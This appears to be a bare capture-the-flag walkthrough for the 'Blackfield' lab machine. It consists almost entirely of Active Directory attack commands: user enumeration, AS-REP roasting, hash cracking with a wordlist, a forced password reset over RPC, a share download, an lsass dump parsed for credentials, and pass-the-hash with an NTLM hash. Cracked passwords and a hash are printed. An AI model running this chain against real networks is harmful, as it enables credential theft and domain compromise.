---
title: "Blackfield"
---

# Blackfield

```bash
impacket-lookupsid anonymous@blackfield.local -target-ip 10.10.10.192 | grep SidTypeUser | tr '\\' ' ' | awk '{print $3}'
```

```bash
impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt
```

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
support \ #00^BlackKnight
```

```
rpcclient -U support 10.10.10.192
setuserinfo2 AUDIT2020 23 'vDWkN&x4pE2cJ1Py0g1X'
```

```
AUDIT2020 \ vDWkN&x4pE2cJ1Py0g1X
```

```bash
smbclient //10.10.10.192/forensic -U AUDIT2020%'vDWkN&x4pE2cJ1Py0g1X'
```

```
recurse ON
prompt OFF
mget *
```

```bash
pypykatz lsa minidump lsass.dmp
```

```bash
netexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```
